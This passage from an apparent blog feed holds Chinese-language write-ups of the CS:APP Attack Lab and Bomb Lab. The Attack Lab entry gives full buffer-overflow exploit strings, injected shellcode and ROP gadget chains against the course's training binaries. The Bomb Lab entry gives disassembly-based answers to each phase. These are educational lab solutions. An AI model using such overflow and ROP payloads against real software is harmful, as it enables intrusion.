90 00 38 68 55]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Attacklab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Attacklab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第三篇文章。具体题目请见官网。本文主要讲csapp中的attacklab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 个人觉得这个实验比起前面两个还是要稍微简单一点的，但是强烈建议把官网给的资料看一下，看完相信对完成这个实验还是有很大帮助的。整个实验主要是一开始无从下手以及最后一个level比较麻烦，但结合资料的相关提示的话，做起来难度还是不大的，建议尝试着不看任何其他教程自己独立完成。 attacklab 实验要求 这个实验要求我们使用缓冲区溢出对ctarget和rtarget进行攻击。总共有五个关卡，其中，前三个要求使用代码注入(code injection)对ctarget进行攻击，后面两个要求使用return-oriented programming(ROP)对rtarget进行攻击。 实验文件：ctarget 和 rtarget：我们需要攻击的对象。hex2raw：帮助我们用来生成攻击字符串的文件。cookie: 识别文件，用来区分不同的用户(一般拿到的值是一个随机的8位16进制数)farm.c：用于提供gadget，与后面两个关卡有关。 实验目的：熟练掌握gdb和objdump的相关功能加深对缓冲区溢出现象的理解，以及懂得如何简单地对某个程序进行缓冲区溢出攻击了解x86-64的一些指令的编码等 target 文件的一些注意点 无论是rtarget还是ctarget两个文件都有相似的构造。两个文件都包含有下面的函数。12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; 其中，BUFFER_SIZE是宏定义，我们暂时不知道是多少，然后Gets()函数和gets()函数的功能基本相同。很明显，一旦我们输入的字符串比较长的时候，这就会产生缓冲区溢出的现象。因此，我们需要利用这一点，对该程序进行攻击。具体其他很多函数的细节，其实可以完全不去管。我们需要做的仅仅是生成一个特定的满足要求的字符串，通过overwrite栈上面的数据，使得getbuf函数无法顺利返回，并且，成功运行事先就存在于文件中的函数touchx()。 再次强调一下，所有需要了解的相关细节和知识点在官方资料中都有提到，本文基本上只是对该资料的部分内容进行翻译，以及提供一个完成该实验的思路，仅供参考。 Part I：level 1 第一题比较简单，是让我们熟悉一下相关的一些操作。在正式开始实验以前，建议先使用objdump将rtarget和ctarget反编译，可以使用类似objdump -d ctarget &gt; ctarget.txt 等命令将反编译文件写入txt中，便于查看。 我们先看一下getbuf中BUFFER_SIZE究竟是多少。查看ctarget.txt中的内容有以下几行：12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 由上图，我们可以看到，BUFFER_SIZE应该是一个小于40(0x28)的数字。%rsp+0x28上存放的地址就是函数正确返回的时候，PC需要指向的地址。这也是我们需要overwrite的地方。123456void touch1() &#123; vlevel = 1; printf("Touch1!: You called touch1()\n"); validate(1); exit(0);&#125; 如上图，touch1不需要我们传入任何参数，因此我们只需要将返回地址覆盖为touch1的入口地址即可。注意这里是采用小端法。 注意到，一个函数返回时，对应的汇编语句为 ret，这个时候程序会取出位于栈顶的8个字节的数据，并将其弹出，最后再将PC(program counter)更改为从栈顶取出的那个数据，本质上这其实就是一个control transfer的过程，将控制权从一个函数转移到另一个函数。答案可以为： 61 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 61c0 17 40 00 00 00 00 00 /* 这一行即为touch1的入口地址。前面的40个字节在函数返回时相当与丢失了。 */ 将上图中的编码存在某个文件中(这里我存在ctarget1.txt中)，然后使用如下指令即可(注意ctarget和hex2raw应该在当前目录下)： cat ctarget1.txt | ./hex2raw | ./ctarget -q Part I： level 2 有了上一题的基础，我们对实验稍微熟悉一些了。接下来的我们需要进入touch2函数了。12345678910void touch2(unsigned value) &#123; vlevel = 2; if (val == cookie) &#123; ... validate(2); &#125; else &#123; ... fail(2); &#125;&#125; 这个函数需要我们传入一个参数，同时这个参数还要和cookie相等(还记得实验文件中有一个cookie吗？这个cookie就是就是那个文件里面的数字的值)。 由于需要传入参数，没那么好处理了。这个时候我们就需要注入自己的代码了。 我们需要实现这样的一个指令： mov $cookie, %rdi // cookie为和每个用户对应的那个数字ret 为了获取这个指令的机器级表示，我们可以用gcc将其编译成obj，再用objdump反编译，可以得到对应的机器码。然后，再将其写入txt文件中即可。这里，我的答案是： bf fa 97 b9 59 /* Set %rdi to cookie*/c3 60 60 60 60 /* transfer control to touch2 */60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6078 dc 61 55 00 00 00 00ec 17 40 00 00 00 00 00 %rsp+028并且函数返回之后，PC将指向0x5561dc78，在这里即为bf字节对应的地址。顺利执行完mov语句后，执行c3(ret指令)，PC将指向0x4017ec，这里即为函数touch2的入口地址。继续，使用类似上面的命令将攻击字符串导入，第二题顺利解决。 Part I： level 3 和上一题类似，本题需要传入的是一个char指针，即将cookie的那串数字看成字符串。注意，0x不包含在这个字符串当中。同样的，我们可以使用类似上一题的方法，将我们需要的代码和cookie字符串(这里应该查询ASCII码，找到自己的那个串中每个字符对应的数字为多少)注入其中。 值得注意的是，本题有一个陷阱，当执行touch3的时候，touch3内部执行了hexmatch函数，这里会覆盖掉栈中我们注入的一些数据。但注意到栈是往下生长的，我们只要把cookie字符串放在上面即可。以下为我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60b0 dc 61 55 00 00 00 00 // 覆盖掉原先的返回地址，指向下方我们注入的那个函数fa 18 40 00 00 00 00 0048 c7 c7 c0 dc 61 55 c3 // 这一行将cookie的首地址mov到%rdi上，并返回00 00 00 00 00 00 00 0035 39 62 39 39 37 66 61 // 这一行为我的cookie值 Part II： level 2 这一道题开始，难度有点加大了。在rtarget文件中，采用了地址空间布局随机化，以及限制栈上的代码无法被执行等方式，使得我们无法采用代码注入对程序进行攻击。这个时候我们需要采用return-oriented programming（ROP）技术来攻击代码。具体如下图。123void setval_210(unsigned \*p) &#123; \*p = 3347663060U;&#125; 对于上面这个函数，我们看起来好像没有什么特别的。但倘若从机器码的角度来看呢？ 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)400f1b: c3 retq 好像还是没有什么特别的。但我们注意到，48，89，c7还可以被理解成另一种意思。如果这个函数是从400f18地址开始的，那么将变成： 400f18: 48 89 c7 movq %rax, %rdi400f1b: c3 retq 整个程序的意思完全变了！这就是ROP的特点。利用别人自身的代码攻击别人。只要换了一个位置开始解读，整个程序的结果就会发生很大的变化。我们要做的正是利用这一点来攻击rtarget。为了方便我们的攻击，rtarget中含有很多类似上面这样的容易攻击的函数。从start_farm开始，到end_farm都是我们可以利用来攻击的gadget。 这个时候我们再来看一下题目的要求。我们需要使用ROP进入touch2中，并且传入正确的cookie。进入touch2还容易，可cookie怎么找？直接找源代码中有没有读应的字节序列吗？这不太可能。注意到还有这个代码popq，对应的编码为0x58~0x5f。怎么用呢？我们实现将cookie注入栈上，然后跳转到某个指令。popq将这个cookie取下，并放在某个寄存器中。然后在将其移动到%rdi。最后再跳转到touch2完成任务。 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60ab 19 40 00 00 00 00 00 // 跳转到0x4019ab，实现popq，将cookie取下fa 97 b9 59 00 00 00 00 // 我自己的cookiea2 19 40 00 00 00 00 00 // 跳转到0x4019a2，将cookie移动至%rdiec 17 40 00 00 00 00 00 // 跳转到0x4017ec，即touch2所在地址 Part II： level 3 这道题需要实现跳转到touch3中，并且传入char指针，指向我们的cookie字符串。明显有一定难度。官方资料中将我们可能需要用到的指令列出来。如下。 由官方所给的提示，我们知道答案应该主要是用mov指令来实现的。注意到mov指令均含有89这个数字，我们可以使用ctrl+f查找有可能被我们用到的gadget。再次，我找到的如下。左边为该实现该指令需要跳转向的地址。123456789101112131415161718192021222324254019ab 58 pop %rax 90 nop c3 ret4019a2 48 89 c7 mov %rax, %rdi c3 ret4019dd 89 c2 mov %eax, %edx 90 nop c3 ret401a06 48 89 e0 mov %rsp, %rax c3 ret401a69 89 d1 mov %edx, %ecx 08 db orb %bl, %bl c3 ret401a42 89 c2 mov %eax, %edx 84 c0 testb %al, %al c3 ret401a27 89 ce mov %ecx,%esi 38 c0 cmpb %al, %al c3 ret 我们如果直接将字符串放在栈当中，但我们又不知到位置，没办法得到对应的指针。因此我们想采用栈顶指针+偏移量的做法。一开始，笔者在这里卡了非常久，一直找不到比较好的办法来解决。直到我看见了farm中有这样一个函数：123long add_xy(long x, long y) &#123; return x+y;&#125; 所以答案，瞬间解决了。按顺序，总共8个gadget，每一个gadget对应的汇编代码如下(ret省去)：12345678mov %rsp, %raxmov %rax, %rdipop %raxmov %eax, %edxmov %edx, %ecxmov %ecx, %esileaq (%rdi, %rsi, 1) %raxmov %rax %rdi 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6006 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00ab 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0027 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100 总结 转眼间寒假已经过了好几天了。今天花了接近一天的时间完成了这个实验，以及写下这篇博客。总的来说，虽然做实验的过程很辛苦，但是做完感觉还是很舒服的。虽然我也不知到为什么想要把所有实验的过程都用博客记录下来(这么偏僻的地方应该也没有人会过来看吧)。可能是为了锻炼自己写报告的能力？？？好吧，我也不知道。还是希望自己好好加油，继续坚持写下去吧。这也才仅仅是第三篇而已，还有8篇呢。。 頑張ってくださいね～！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Bomblab]]></title>
    <url>%2F2019%2F01%2F12%2Fcsapp-Bomblab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第二篇文章。具体的题目请见官网。另，本文均为自己手打，可能会有不少错误。如若发现有错误或者哪里写得不清楚，欢迎联系我修改(右下角小图标点开即可对话)。 这个lab从头到尾都是自己慢慢看过来的，花了很长的时间，也不知道算不算值得吧。个人见解：看反汇编代码是真的很花时间，对着几十行的代码有的时候看了几个小时还是懵的。这个时候还是换一下心情，做点别的事，可能突然就看懂了。但也不要看到代码多就直接放弃了吧，沉下心来看，还是可以看得懂的。 bomb lab实验要求 如同字面上的意思，这个实验要求我们拆一个“炸弹”。总共有六个关卡，需要保证每一个题目的输出结果都能满足某个特定的要求（答案不一定唯一），否则炸弹爆炸，游戏失败。 实验文件：bomb: 炸弹，打开后需要正确输入对应的字符串才能通关bomb.c: bomb的main函数所在的文件，提供给我们进行查看 实验目的：考察gdb的使用，以及reverse engneering的能力。需要学会使用gdb参考网站 さあ、私たちの実験を始めましょう。 首先，我们需要先使用objdump -d bomb &gt; bomb.txt这个命令，将bomb反编译，并保存在txt文件当中，方便我们查看。然后，不妨来看一下bomb.c的代码，方便我们对整个实验有一个整体的了解。 注意看一下注释，上面告诉了我们，可以将已解决的答案放入另一个txt文件当中，运行时用run &lt; answer.txt将其导入，可以不用重复打。然后我们看一下整体，总共有六个字符串，每一个字符串输入后，会判断是否正确，错误则发生爆炸，正确则继续输入。看完之后，就准备进入反编译得到的文件了。 bomb.txt 我们先整体看一下这个文件里面有什么。文件很长，总共有一千多行，不可能每一行都去解读。我们可以利用一些小技巧帮助我们理解。如main函数，我们可以看到它分成如下的几个部分。12345678910111213141516171819202122// 读取第一个字符串 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; 400e37: 48 89 c7 mov %rax,%rdi 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; 400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e44: bf a8 23 40 00 mov $0x4023a8,%edi 400e49: e8 c2 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第二个 400e4e: e8 4b 06 00 00 callq 40149e &lt;read_line&gt; 400e53: 48 89 c7 mov %rax,%rdi 400e56: e8 a1 00 00 00 callq 400efc &lt;phase_2&gt; 400e5b: e8 64 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e60: bf ed 22 40 00 mov $0x4022ed,%edi 400e65: e8 a6 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第三个 400e6a: e8 2f 06 00 00 callq 40149e &lt;read_line&gt; 400e6f: 48 89 c7 mov %rax,%rdi 400e72: e8 cc 00 00 00 callq 400f43 &lt;phase_3&gt; 400e77: e8 48 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e7c: bf 0b 23 40 00 mov $0x40230b,%edi 400e81: e8 8a fc ff ff callq 400b10 &lt;puts@plt&gt; ... 结合bomb.c，我们应该可以很容易理解main.c的反汇编代码了。接下来，我们再看下其他函数。 1.strings_not_equal函数。名字很明显告诉了我们，这个函数是判断两个字符串是否相等的。相等则返回0 2.explode_bomb函数，注意到，其中使用了exit函数。也就是说，这个函数一旦运行，就意味着游戏失败，直接exit退出。12345678000000000040143a &lt;explode_bomb&gt;: 40143a: 48 83 ec 08 sub $0x8,%rsp 40143e: bf a3 25 40 00 mov $0x4025a3,%edi 401443: e8 c8 f6 ff ff callq 400b10 &lt;puts@plt&gt; 401448: bf ac 25 40 00 mov $0x4025ac,%edi 40144d: e8 be f6 ff ff callq 400b10 &lt;puts@plt&gt; 401452: bf 08 00 00 00 mov $0x8,%edi 401457: e8 c4 f7 ff ff callq 400c20 &lt;exit@plt&gt; 3.read_line函数。由名字我们也可以知道，这个函数就是为了读取一行字符串。 4.read_six_numbers函数。由名字，我们知道，这个函数就是用来读六个数字。注意代码中用到了sscanf函数，用于从某一个字符串中格式化读取。其中%rdi存放的是待读取字符串，%rsi存储的是用于格式化的串，后面跟着的都是变量的地址。如sscanf(“7 0”, “%d %d”, &amp;a, &amp;b)，返回值为成功读取的变量个数。 5.phase_1 phase_2 … 用于判断输入的字符串是否满足要求 phase_11234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; // 直接判断与0x402400位置的字符串是否相同 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 题目很短，难度也很小，就是将读取的字符串直接与首地址为0x402400的字符串作比较，若相同则返回，否则引爆炸弹。因此，我们需要知道0x402400中究竟放着什么字符串。直接从反汇编代码中没办法看出来，这个时候就要用到强大的gdb了。需要用到x命令。语法为: x/&lt;n/f/u&gt; 其中，n是一个正整数，表示需要显示的内存单元的个数。每个内存单元的大小与u相关。u表示每个单元的大小。f表示输出的格式。较常用的如下。 x 按十六进制格式输出 d 按十进制格式输出 t 按二进制格式输出 c 按字符格式输出 如：x/10c 0x402400 将以字符形式输出从0x402400开始的十个字节 x/10xw 0x402400 将以字符形式输出从0x402400开始的十个单元，每个单元为4个字节 具体的使用自己试一试就知道了。我们直接查看内存后就发现，对应的字符串为： Border relations with Canada have never been better. 第一题结束。 phase_2 第二题，长度明显加长了一些。我们可以试着将其分段解读。至于从哪里开始分的话，尽量是选择jmp类的命令所在的行或者jmp命令跳转到的行，这种地方有可能是for循环，或者条件分支语句的结尾。就第二题来说，我们可以将其分成两个部分。第一个部分如下：123456400efe: 48 83 ec 28 sub $0x28,%rsp // 分配40kb的内存空间400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; // 将空间传给函数，读取六个数字400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) // 判断第一个数字是否为1400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; // 为1，跳开；否则，引爆炸弹400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 第二个部分如下：12345678400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax // 取出下一个数字，并*2400f1c: 39 03 cmp %eax,(%rbx) // 判断每一个数字是否为上一个数字的两倍400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; // 是，跳开；不是，爆炸400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; // 循环体内部，依次判断输入是否正确400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 于是我们发现，整个程序对我们的要求有三个： 1.输入六个数字 2.第一个数字是1 3.第二个数字开始，每一个数字是前一个的两倍 由此，我们可以得到结果为：1， 2， 4， 8， 16， 32 phase_3 第三题，题目又变长了一些。在400f65之前，就是用sscanf读入两个数字。也就是说这次我们需要输入两个满足特定关系的数字。 再接下来的三行，程序判断输入的第一个数字是否大于小于等于7，否则爆炸。 接下来一行是重点了。1400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 这个代码是什么意思呢？注意号的作用,该指令跳转的目标点是地址为0x402470+8%rax的内存单元。因此，我们需要打印出来0x402470+8i的值，对照代码后会发现，其实源代码应该就是一个switch函数。再看下接下来的几行代码，基本都是这样的格式：12400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 也就是说，根据你所输入的第一个数，你的第二个数需要对应这跳转目标点mov赋的值。为了简单起见，笔者直接打印0x402470，得到答案。12345678// b为我们输入的第一个数字，v为我们输入的第二个数字。int a;switch(b) &#123; case 0: a = ... case 1: a = ... case 2: a = ...&#125;if (a != v) explode_bomb(); phase_4 这道题看起来难度并不大。前面我们已经做了三道题了，基本上开始能够看懂一些复杂一点点的代码。phase_3函数应该也就不成问题了。首先输入两个数字，第二个数字必须为0，第一个数字将放入func4函数当中。也就是说，我们目的就是看懂func4这个函数在干什么。然后根据函数推断出我们需要输入的第一个数字即可。1234400fd6: 89 c1 mov %eax,%ecx400fd8: c1 e9 1f shr $0x1f,%ecx400fdb: 01 c8 add %ecx,%eax400fdd: d1 f8 sar %eax 首先，上面这个部分一开始让我迷惑了很久，这是要干嘛？？其中shr向右移动31位只有两个结果，当%ecx的值大于等于0时，得到结果为0，否则得到-1。因此这几行其实是当%eax的值小于0的时候就减去1。最后再向又移一位（缺省则位移一位）。 再接下来这段笔者看了特别久，最后是采用尝试着打出源代码才理解的。如果有跟我一样的看不太懂的，也不妨试试这个办法。12345678910111213141516400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 如上，将其通过跳转指令划分为4个部分。然后我们发现它调用了自己，也就是说这是一个递归函数。注意到phase_4调用它之前放入了3个参数。我们可以尝试着打出源代码。1234567891011// a为我们输入的数，b初始为0，c初始值为15。我们需要返回的值是0。因此，只需要让一开始tt就等于a即可void func4(int a, int b, int c)&#123; int t = c-b; if(t&lt;0) t--; t&gt;&gt;=1; int tt=t+b; if(tt&gt;a) c=tt-1; return 2*func4(a,b,c); else if (tt==a) return 0; else return 2*func4(a,tt+1,c)+1;&#125; phase_5 这道题长度又一次增加了，不过好在难度还不算太大。其实能做完第四题的话做第五题问题应该是不大的。和之前一样。我们先尝试着将整个代码拆分成几个部分。 首先，要求我们输入的应该是一个字符串，且长度必须为6。接下来的几行是一个循环，我们先跳过。先看最后面的几行代码。12344010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp)4010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 上面几行将栈上面位于%rsp+10～%rsp+15的字符串与首地址为0x40245e的字符串相比较，打印地址后我们看到，字符串为flyers，也就是说我们的输入经过变换之后要变成flyers这个字符串。这个时候我们再回去看一下循环体内部是怎样做变换的。12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx40108f: 88 0c 24 mov %cl,(%rsp)401092: 48 8b 14 24 mov (%rsp),%rdx401096: 83 e2 0f and $0xf,%edx401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1)4010a4: 48 83 c0 01 add $0x1,%rax4010a8: 48 83 f8 06 cmp $0x6,%rax4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 注意到这一段代码，一次取出每一个字符。并将其与0xf相与，也就是说我们取出后四位的值c，再加上0x4024b0得到一个值v，再取出内存地址为v的值，放入栈当中。这样说可能有点难理解。我们来举一个例子。比如第一个字符串处理之后要变成’f’，查询ASCII得，相当与102，也就是0x66, 再查看一下内存，看到‘f’位于0x4024b9。因此我们需要的c的值为9，为了方便，我第一个字符输入的是i(0x69),和0xf相与之后恰好为9，满足要求。后面的同理，不再赘述。由此，本题成功解决了。 phase_6 这道题可以说是有点丧心病狂了。难度和之前感觉完全不在一个档次上。不过毕竟是压轴题，也可以理解。同样的，我们先将代码拆分成几个小部分。 首先，题目读取了六个数字。然后需要对这六个数字做出相当长的处理。下面的这一段应该是目前为止最难理解的一个点。如果无法理解，还请多看几遍。12345678910111213141516171819202122232425// 下面为一个嵌套循环，终止条件为r12 == 6 目的为检测是否所有字符均不相等以及小于等于6// %eax = a[i] (%r13)// %rbp = &amp;a[i]401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov (%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; // a[i] &gt; 6 爆炸401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; // %r12 == 6 退出循环// 第二层循环401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; // a[i] != a[i+j] 否则爆炸401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;// 第二层循环外40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 接下来的部分就比较好理解了。最终对整个程序的影响是将每一个值a[i]转化为7-a[i]。123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax) // a[i] = 7 - a[i]401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 再接下来这一段就比较麻烦了。和之前一样，我采用了尝试这打出源代码的方法进行理解。由于接下来的两段代码经常要访问内存，为了方便理解，我将内存代码打出来，欢迎查阅。 address address + 4 address + 8 address + 12 0x6032d0 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 0x000002b3 0x00000004 0x00603300 0x00000000 0x603310 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 0x000001bb 0x00000006 0x00000000 0x00000000 12345678910111213141516401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 123456789101112 // %rsi : 4 * i // %eax : 用于和a[i]做比较 // %ecx : a[i]for (int i = 0; i &lt; 6; i++)&#123; if (a[i]&lt;=1) &#123; M[%rsp + 8 * i + 32] = 0x6032d0; &#125; else &#123; // 经查看内存可得 M[%rsp + 8 * i + 32] = 0x6032d0 + 16 * (a[i]-1); &#125;&#125; 关于上面的这段函数，我们可以理解为它在构造一个结构体Node(注意，指针为64位，且为小端)，其中Node的成员如下：12345Node &#123; int value; int id; Node* next;&#125; 倘若我们这样看，会发现整个代码容易理解了很多，结合具体内存中的值，我们发现，下面的这一段其实就是将各个结构体元素连接起来，形成一个链表。1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 最后这一段其实就好理解很多了。其实就是从前往后遍历链表，然后检查下一个结构体元素的value是否大于上一个的，否则爆炸。再看一下前面的内存值。我们就可以得到满足每一个元素value均大于上一个的链表的顺序了：2，1，6，5，4，3。当然要是你信心满满直接把这个顺序输入进去的话（像我一样），你会发现，炸弹还是爆炸了。别忘了，前面有一个操作将a[i]变成了7-a[i]，因此，我们应该再处理一下，得到最终的正确答案为：5，6，1，2，3，4 Congratulations! You’ve defused the bomb.1234567894011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; secret_phase 然而，真的通关了吗？ 细心的同学可能会发现（我也发现啦！），在bomb.c中有着这样一段注释： /Wow, they got it! But isn’t something… missing? Perhaps something they overlooked? Mua ha ha ha ha! 从这句话，我们可以猜出，作者果然还是有阴谋的。于是我们再重新回去看了一下，发现了一个神奇的函数，叫secret_phase，果然有问题。crtf+f查找，发现这是在phase_defused中调用的，而且再看一下它调用的相关代码：12344015d1: 48 89 44 24 68 mov %rax,0x68(%rsp)4015d6: 31 c0 xor %eax,%eax4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt;4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 我们发现，只有当前6个炸弹全部拆除后才可以调用。这不明摆着是彩蛋了吗。接下来一大坨代码就是看你能不能顺利揭开彩蛋了。 接下来，再看下这坨代码：12345678910111213144015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r84015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx4015f0: be 19 26 40 00 mov $0x402619,%esi4015f5: bf 70 38 60 00 mov $0x603870,%edi4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; // 读取两个整数和一个字符串4015ff: 83 f8 03 